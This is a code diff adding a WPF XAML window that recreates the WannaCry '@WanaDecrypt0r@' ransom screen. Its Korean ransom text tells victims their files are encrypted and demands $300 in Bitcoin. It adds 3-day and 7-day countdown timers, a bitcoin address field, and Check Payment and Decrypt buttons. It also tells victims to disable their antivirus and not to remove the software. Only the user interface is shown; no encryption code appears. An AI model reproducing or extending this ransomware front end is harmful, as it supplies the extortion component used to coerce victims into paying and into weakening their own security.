@@ -1,0 +1,419 @@
+﻿<Window x:Class="_WanaDecryptor_.MainWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="clr-namespace:_WanaDecryptor_"
+        mc:Ignorable="d"
+        
+        Title="@WanaDecrypt0r@.exe"
+        
+        Height="725" Width="1020"
+        
+        ResizeMode="NoResize" 
+        
+        Background="#FF710909"
+        
+        WindowStartupLocation="CenterScreen"
+        
+        Loaded="Window_Loaded" 
+        Closing="Window_Closing">
+    <Grid>
+        <Image
+            HorizontalAlignment="Left"
+            Height="152"
+            Margin="88,10,0,0" 
+            VerticalAlignment="Top"
+            Width="155" 
+            Source="/Resources/img_lock.png"
+            Stretch="Fill"/>
+
+
+        <Label 
+            Content="Ooops, your files have been encrypted!" 
+            Margin="0,10,176,0" 
+            VerticalAlignment="Top" 
+            Foreground="White"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"
+            FontSize="20" 
+            FontWeight="Bold" HorizontalAlignment="Right"/>
+
+
+        <ComboBox
+            Margin="0,15,0,0" 
+            Width="120" 
+            VerticalAlignment="Top"
+            HorizontalAlignment="Right"
+            SelectedIndex="0"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE" Grid.Column="1">
+
+            <ComboBoxItem Content="한국어"/>
+        </ComboBox>
+
+
+        <RichTextBox
+            Height="494"
+            Margin="0,48,0,0"
+            VerticalAlignment="Top"
+            Width="694"
+            HorizontalAlignment="Right"
+            FontSize="16"
+            HorizontalScrollBarVisibility="Disabled" 
+            VerticalScrollBarVisibility="Visible" 
+            IsReadOnly="True" 
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE" 
+            Grid.Column="1">
+
+            <FlowDocument>
+                <Paragraph>
+                    <InlineUIContainer>
+                        <TextBlock TextWrapping="Wrap" Text="내 컴퓨터는 어떻게 되었습니까?" FontSize="20" FontWeight="Bold"/>
+                    </InlineUIContainer>
+                    <LineBreak />
+                    <Run Text="중요한 파일은 암호화됩니다." />
+                    <LineBreak />
+                    <Run Text="문서, 사진, 비디오, 데이터베이스 및 기타 파일은 암호화되어있어 더 이상 액세스 할 수 없습니다. 어쩌면 파일을 복구 할 수있는 방법을 찾느 라 바쁘지 만, 시간을 낭비하지 않아도됩니다. 누구도 암호 해독 서비스 없이는 파일을 복구 할 수 없습니다." />
+                    <LineBreak />
+                    <LineBreak />
+                    <InlineUIContainer>
+                        <TextBlock TextWrapping="Wrap" Text="내 파일을 복구 할 수 있습니까?" FontSize="20" FontWeight="Bold"/>
+                    </InlineUIContainer>
+                    <LineBreak />
+                    <Run Text="확실한. 모든 파일을 안전하고 쉽게 복구 할 수 있습니다. 그러나 너는 그렇게 충분한 시간이 없다." />
+                    <LineBreak />
+                    <Run Text="모든 파일의 암호를 해독하려면 지불해야합니다.지불을 제출하는 데는 3 일 밖에 남지 않았습니다. 그 후 가격이 배가됩니다.또한 7 일 내에 비용을 지불하지 않으면 파일을 영구적으로 복구 할 수 없습니다.우리는 6 개월 안에 돈을 내지 못해서 매우 가난한 사람들을위한 무료 이벤트를 가질 것입니다." />
+                    <LineBreak />
+                    <LineBreak />
+                    <InlineUIContainer>
+                        <TextBlock TextWrapping="Wrap" Text="어떻게 지불하나요?" FontSize="20" FontWeight="Bold"/>
+                    </InlineUIContainer>
+                    <LineBreak />
+                    <Run Text="지불은 Bitcoin에서만 허용됩니다. 자세한 내용을 보려면 &lt;About bitcoin&gt;를 클릭하십시오." />
+                    <Run Text=" "/>
+                    <Run Text="Bitcoin의 현재 가격을 확인하고 비트 코인을 구입하십시오. 자세한 내용은 &lt;How to buy bitcoins&gt;을 클릭하십시오." />
+                    <Run Text=" "/>
+                    <Run Text="이 창에 지정된 주소로 정확한 금액을 보내십시오.지불 후 &lt;Check Payment&gt;을 클릭하십시오. 확인하기 가장 좋은 시간 : 월요일부터 일요일까지 오전 9 시부 터 오전 11 시까 지 그리니치 표준시." />
+                    <Run Text=" "/>
+                    <Run Text="지불이 확인되면 즉시 파일의 암호 해독을 시작할 수 있습니다." />
+                    <LineBreak />
+                    <LineBreak />
+                    <InlineUIContainer>
+                        <TextBlock TextWrapping="Wrap" Text="접촉" FontSize="20" FontWeight="Bold"/>
+                    </InlineUIContainer>
+                    <LineBreak />
+                    <Run Text="도움이 필요하면 &lt;Contact Us&gt;를 클릭하여 메시지를 보내십시오." />
+                    <LineBreak />
+                    <LineBreak />
+                    <InlineUIContainer>
+                        <TextBlock TextWrapping="Wrap" Text="이 소프트웨어를 제거하지 말고 지불하고 지불이 처리 될 때까지 잠시 동안 안티 바이러스를 비활성화하십시오. 안티 바이러스가 업데이트되고이 소프트웨어가 자동으로 제거되면 비용을 지불하더라도 파일을 복구 할 수 없습니다!" FontSize="16" Foreground="Red"/>
+                    </InlineUIContainer>
+                </Paragraph>
+            </FlowDocument>
+        </RichTextBox>
+
+
+        <Rectangle
+            Fill="#FF710909"
+            HorizontalAlignment="Left"
+            Height="172"
+            Margin="14,177,0,0"
+            Stroke="White"
+            VerticalAlignment="Top"
+            Width="285"/>
+
+        <Label 
+            Content="Payment will be raised on"
+            HorizontalAlignment="Left"
+            Margin="54,189,0,0"
+            VerticalAlignment="Top"
+            Foreground="#FFFFDC00"
+            FontWeight="Bold"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"
+            FontSize="16"/>
+
+        <Label
+            x:Name="Date1"
+            Content="2020/09/10 21:40:00"
+            HorizontalAlignment="Left"
+            Margin="96,220,0,0"
+            VerticalAlignment="Top"
+            Foreground="White"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"/>
+
+        <Label
+            Content="Time Left"
+            HorizontalAlignment="Left"
+            Margin="124,268,0,0"
+            VerticalAlignment="Top"
+            Foreground="White"
+            FontWeight="Bold"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"/>
+
+        <ProgressBar
+            x:Name="ProgressBar1"
+            HorizontalAlignment="Left"
+            Height="22"
+            Margin="234,262,0,0"
+            VerticalAlignment="Top"
+            Width="100"
+            RenderTransformOrigin="0.5,0.5"
+            Background="#FFE6E6E6"
+            BorderThickness="1"
+            Maximum="259200" 
+            Grid.ColumnSpan="2">
+
+            <ProgressBar.Foreground>
+                <LinearGradientBrush 
+                    EndPoint="0.5,1"
+                    MappingMode="RelativeToBoundingBox"
+                    StartPoint="0.5,0">
+                    <LinearGradientBrush.RelativeTransform>
+                        <TransformGroup>
+                            <ScaleTransform CenterY="0.5" CenterX="0.5"/>
+                            <SkewTransform CenterY="0.5" CenterX="0.5"/>
+                            <RotateTransform Angle="270" CenterY="0.5" CenterX="0.5"/>
+                            <TranslateTransform/>
+                        </TransformGroup>
+                    </LinearGradientBrush.RelativeTransform>
+                    <GradientStop Color="#FFDE0000"/>
+                    <GradientStop Color="#FF3AFF00" Offset="1"/>
+                    <GradientStop Color="#FF954400" Offset="0.603"/>
+                </LinearGradientBrush>
+            </ProgressBar.Foreground>
+            <ProgressBar.RenderTransform>
+                <TransformGroup>
+                    <ScaleTransform/>
+                    <SkewTransform/>
+                    <RotateTransform Angle="270"/>
+                    <TranslateTransform/>
+                </TransformGroup>
+            </ProgressBar.RenderTransform>
+        </ProgressBar>
+        <Label
+            x:Name="Timer1"
+            Content="00:00:00:00"
+            HorizontalAlignment="Left"
+            Margin="24,292,0,0" 
+            VerticalAlignment="Top" 
+            Foreground="White"
+            FontSize="30" 
+            Height="47"
+            Width="246"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Danger on the Motorway"/>
+
+
+        <Rectangle
+            Fill="#FF710909"
+            HorizontalAlignment="Left"
+            Height="172"
+            Margin="14,369,0,0"
+            Stroke="White"
+            VerticalAlignment="Top"
+            Width="285"/>
+        <Label 
+            Content="Your files will be lost on"
+            HorizontalAlignment="Left"
+            Margin="62,381,0,0"
+            VerticalAlignment="Top"
+            Foreground="#FFFFDC00"
+            FontWeight="Bold"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"
+            FontSize="16"/>
+        <Label
+            x:Name="Date2"
+            Content="2020/09/10 21:40:00"
+            HorizontalAlignment="Left"
+            Margin="96,412,0,0"
+            VerticalAlignment="Top"
+            Foreground="White"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"/>
+        <Label
+            Content="Time Left"
+            HorizontalAlignment="Left"
+            Margin="124,460,0,0"
+            VerticalAlignment="Top"
+            Foreground="White"
+            FontWeight="Bold"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"/>
+        <ProgressBar
+            x:Name="ProgressBar2"
+            HorizontalAlignment="Left"
+            Height="22"
+            Margin="234,454,0,0"
+            VerticalAlignment="Top"
+            Width="100"
+            RenderTransformOrigin="0.5,0.5"
+            Background="#FFE6E6E6"
+            BorderThickness="1"
+            Maximum="604800" 
+            Grid.ColumnSpan="2">
+
+            <ProgressBar.Foreground>
+                <LinearGradientBrush 
+                    EndPoint="0.5,1"
+                    MappingMode="RelativeToBoundingBox"
+                    StartPoint="0.5,0">
+                    <LinearGradientBrush.RelativeTransform>
+                        <TransformGroup>
+                            <ScaleTransform CenterY="0.5" CenterX="0.5"/>
+                            <SkewTransform CenterY="0.5" CenterX="0.5"/>
+                            <RotateTransform Angle="270" CenterY="0.5" CenterX="0.5"/>
+                            <TranslateTransform/>
+                        </TransformGroup>
+                    </LinearGradientBrush.RelativeTransform>
+                    <GradientStop Color="#FFDE0000"/>
+                    <GradientStop Color="#FF3AFF00" Offset="1"/>
+                    <GradientStop Color="#FF954400" Offset="0.603"/>
+                </LinearGradientBrush>
+            </ProgressBar.Foreground>
+            <ProgressBar.RenderTransform>
+                <TransformGroup>
+                    <ScaleTransform/>
+                    <SkewTransform/>
+                    <RotateTransform Angle="270"/>
+                    <TranslateTransform/>
+                </TransformGroup>
+            </ProgressBar.RenderTransform>
+        </ProgressBar>
+        <Label
+            x:Name="Timer2"
+            Content="00:00:00:00"
+            HorizontalAlignment="Left"
+            Margin="24,484,0,0" 
+            VerticalAlignment="Top" 
+            Foreground="White"
+            FontSize="30" 
+            Height="47"
+            Width="246"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Danger on the Motorway"/>
+
+
+        <Rectangle 
+            Fill="#FF710909"
+            Height="88"
+            Margin="10,551,0,0" 
+            Stroke="White"
+            VerticalAlignment="Top" 
+            Grid.Column="1"
+            HorizontalAlignment="Right"
+            Width="694"/>
+        <Image
+            HorizontalAlignment="Right"
+            Height="72"
+            Margin="0,558,495,0"
+            VerticalAlignment="Top"
+            Width="198" 
+            Source="Resources/img_bitcoin.png" 
+            Stretch="Fill"
+            Grid.Column="1"/>
+        <Rectangle
+            Fill="#FF710909"
+            Height="26"
+            Margin="0,602,45,0"
+            Stroke="White"
+            Width="441"
+            HorizontalAlignment="Right"
+            VerticalAlignment="Top"/>
+        <Label
+            Content="Send  $300  worth  of  bitcoin  to  this  address:"
+            HorizontalAlignment="Right"
+            Margin="0,564,166,0"
+            VerticalAlignment="Top"
+            FontFamily="Arial"
+            FontWeight="Bold"
+            Foreground="#FFFFDC00"
+            FontSize="14"/>
+        <Button
+            x:Name="BitcoinAddressCopyButton"
+            Content="Copy"
+            HorizontalAlignment="Right"
+            Margin="0,602,6,0"
+            VerticalAlignment="Top"
+            Width="34" 
+            Height="26"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE" 
+            Click="BitcoinAddressCopyButton_Click"/>
+
+
+        <Button
+            Content="Decrypt"
+            HorizontalAlignment="Right"
+            Margin="0,0,0,8"
+            VerticalAlignment="Bottom"
+            Width="320" 
+            Height="26"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE" 
+            Click="DecryptButton_Click"/>
+
+
+        <TextBlock
+            HorizontalAlignment="Left"
+            Margin="21,577,0,0"
+            TextWrapping="Wrap"
+            VerticalAlignment="Top"
+            Foreground="White">
+            
+            <Hyperlink 
+                RequestNavigate="Hyperlink_RequestNavigate" 
+                NavigateUri="https://en.wikipedia.org/wiki/Bitcoin"
+                Foreground="#FF2573C1">
+                
+                <Run Text="About bitcoin"/>
+            </Hyperlink>
+        </TextBlock>
+
+
+        <TextBlock
+            HorizontalAlignment="Left"
+            Margin="21,610,0,0"
+            TextWrapping="Wrap"
+            VerticalAlignment="Top"
+            Foreground="White">
+            
+            <Hyperlink 
+                RequestNavigate="Hyperlink_RequestNavigate"
+                NavigateUri="https://bitcoin.org/en/buy"
+                Foreground="#FF2573C1">
+                
+                <Run Text="How to buy bitcoins"/>
+            </Hyperlink>
+        </TextBlock>
+
+
+        <TextBlock
+            x:Name="SendMessageButton"
+            HorizontalAlignment="Left"
+            Margin="21,647,0,0"
+            TextWrapping="Wrap"
+            Text="Contact Us"
+            VerticalAlignment="Top"
+            Foreground="#FF57ABFF"
+            TextDecorations="Underline"
+            FontWeight="Bold"
+            FontFamily="Arial"
+            MouseLeftButtonDown="SendMessageButton_MouseLeftButtonDown"
+            MouseEnter="SendMessageButton_MouseEnter"
+            MouseLeave="SendMessageButton_MouseLeave"/>
+
+
+        <Button
+            x:Name="CheckPaymentButton"
+            Content="Check Payment"
+            HorizontalAlignment="Right"
+            Margin="0,0,374,8"
+            VerticalAlignment="Bottom"
+            Width="320" 
+            Height="26"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"
+            Click="CheckPaymentButton_Click"/>
+
+
+        <TextBlock
+            x:Name="BitcoinAddress"
+            Text=""
+            Margin="524,608,99,0"
+            VerticalAlignment="Top"
+            Foreground="White"
+            FontFamily="/@WanaDecryptor@;component/Resources/#Arial CE"/>
+    </Grid>
+</Window>
